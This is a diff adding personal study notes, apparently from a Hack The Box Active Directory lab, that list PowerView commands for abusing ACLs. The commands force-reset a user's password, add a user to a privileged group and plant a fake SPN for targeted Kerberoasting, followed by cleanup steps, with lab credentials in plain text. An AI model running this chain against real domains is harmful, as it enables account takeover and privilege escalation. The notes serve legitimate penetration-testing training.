@@ -186,4 +186,67 @@ $SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)
 Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose
 ```
-# ACL
+## ACL Enumeration & Exploitation 
+### ACL Rights & What They Mean 
+```
+Find-InterestingDomainACL
+```
+
+**Generic Rights* 
+
+### Changing User Password Based on ACL Information 
+ [!NOTE]  
+> Must authenticate as the user who is able to force change user passwords
+1. Creates PSCredential Object
+``` 
+$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
+```
+```
+$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
+```
+2. Creates secure string object that represents password for target user
+```
+$target-user-Password = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+```
+3. Sets domain user password
+```
+cd Tools 
+Impot-Module .\Powerview.ps1 
+Set-DomainUserPassword -Identity target-user -AccountPassword $target-user-password -Credentials $Cred -Verbose
+```
+## Adding Target User To Privileged Group 
+**Step 1** 
+```
+$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+```
+**Step 2** 
+```
+$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\target-user', $SecPassword)
+```
+**Step 3**
+```
+Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
+
+```
+### Creating fake SPN 
+ [!NOTE]  
+> Must be authenticated as member of group to be successful. 
+> Process: Create fake SPN -> Use rubeus.exe -> crack hashes -> cleanup 
+
+**Fake SPN Creation**
+```
+Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+```
+**Cleanup** 
+1. Remove fake SPN created for adunn user 
+```
+Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
+```
+2. Remove damundsen user for Help Desk 1 group 
+ ``` Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
+ ```
+
+3. Confirm group removal 
+```
+PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
+```
